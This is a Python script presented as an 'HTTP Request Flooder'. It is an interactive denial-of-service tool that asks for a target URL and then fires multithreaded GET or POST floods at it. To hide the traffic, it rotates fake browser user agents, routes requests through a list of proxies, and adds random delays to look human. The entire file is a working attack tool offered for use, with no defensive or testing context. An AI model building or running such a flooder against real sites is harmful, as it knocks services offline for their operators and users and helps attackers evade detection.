import requests
import threading
import random
import time
import argparse
import logging

# Set up logging
logging.basicConfig(filename='request_flood.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# List of user agents to simulate different browsers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/56.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.2 Safari/601.6.17",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
]

# Extensive list of proxies
proxies = [
    "http://192.168.0.1:3128",
    "http://192.168.0.2:3128",
    "http://192.168.0.3:3128",
    "http://192.168.0.4:3128",
    "http://192.168.0.5:3128",
    "http://192.168.0.6:3128",
    "http://192.168.0.7:3128",
    "http://192.168.0.8:3128",
    "http://192.168.0.9:3128",
    #Dev.omori
    "http://192.168.0.10:3128",
    "http://192.168.0.11:3128",
    "http://192.168.0.12:3128",
    "http://192.168.0.13:3128",
    "http://192.168.0.14:3128",
    "http://192.168.0.15:3128",
    "http://192.168.0.16:3128",
    "http://192.168.0.17:3128",
    "http://192.168.0.18:3128",
    "http://192.168.0.19:3128",
    "http://192.168.0.20:3128",
    "http://192.168.0.21:3128",
    "http://192.168.0.22:3128",
    "http://192.168.0.23:3128",
    "http://192.168.0.24:3128",
    "http://192.168.0.25:3128",
    "http://192.168.0.26:3128",
    "http://192.168.0.27:3128",
    "http://192.168.0.28:3128",
    "http://192.168.0.29:3128",
    "http://192.168.0.30:3128",
    "http://192.168.0.31:3128",
    "http://192.168.0.32:3128",
    "http://192.168.0.33:3128",
    "http://192.168.0.34:3128",
    "http://192.168.0.35:3128",
    "http://192.168.0.36:3128",
    "http://192.168.0.37:3128",
    "http://192.168.0.38:3128",
    "http://192.168.0.39:3128",
    "http://192.168.0.40:3128",
    "http://192.168.0.41:3128",
    "http://192.168.0.42:3128",
    "http://192.168.0.43:3128",
    "http://192.168.0.44:3128",
    "http://192.168.0.45:3128",
    "http://192.168.0.46:3128",
    "http://192.168.0.47:3128",
    "http://192.168.0.48:3128",
    "http://192.168.0.49:3128",
    "http://192.168.0.50:3128",
]

# Function to send HTTP request
def send_request(target_url, method, headers, data, num_requests):
    for _ in range(num_requests):
        try:
            user_agent = random.choice(user_agents)
            proxy = {"http": random.choice(proxies)} if proxies else None
            headers['User-Agent'] = user_agent
            
            if method == 'GET':
                response = requests.get(target_url, headers=headers, proxies=proxy, timeout=5)
            elif method == 'POST':
                response = requests.post(target_url, headers=headers, data=data, proxies=proxy, timeout=5)
            else:
                raise ValueError("Unsupported HTTP method.")
            
            logging.info(f"Sent {method} request to {target_url} with status code: {response.status_code}")
            #Dev.omori
            print(f"Sent {method} request to {target_url} with status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            print(f"Request failed: {e}")
        time.sleep(random.uniform(0.1, 1))  # Random delay to simulate human behavior

# Thread worker
def thread_worker(url, method, headers, data, num_requests_per_thread):
    send_request(url, method, headers, data, num_requests_per_thread)

# Parse headers from command-line arguments
def parse_headers(header_string):
    headers = {}
    if header_string:
        header_list = header_string.split(',')
        for header in header_list:
            key, value = header.split('=')
            headers[key.strip()] = value.strip()
    return headers

# Interactive menu
def interactive_menu():
    print("HTTP Request Flooder Configuration Menu")
    print("--------------------------------------")
    target_url = input("Enter the target URL: ").strip()
    method = input("Enter the HTTP method (GET/POST): ").strip().upper()
    if method not in ["GET", "POST"]:
        print("Invalid method. Defaulting to GET.")
        method = "GET"
        #Dev.omori
    num_threads = int(input("Enter the number of threads: ").strip())
    num_requests_per_thread = int(input("Enter the number of requests per thread: ").strip())
    data = input("Enter the data to send with POST requests (leave blank for GET): ").strip()
    headers_input = input("Enter custom headers (key=value, comma-separated): ").strip()
    custom_headers = parse_headers(headers_input)

    return target_url, method, num_threads, num_requests_per_thread, data, custom_headers

if __name__ == "__main__":
    target_url, method, num_threads, num_requests_per_thread, data, custom_headers = interactive_menu()

    # Adding a default header
    custom_headers['Accept'] = 'application/json'

    # Creating threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=thread_worker, args=(target_url, method, custom_headers, data, num_requests_per_thread))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print("Completed sending requests.")
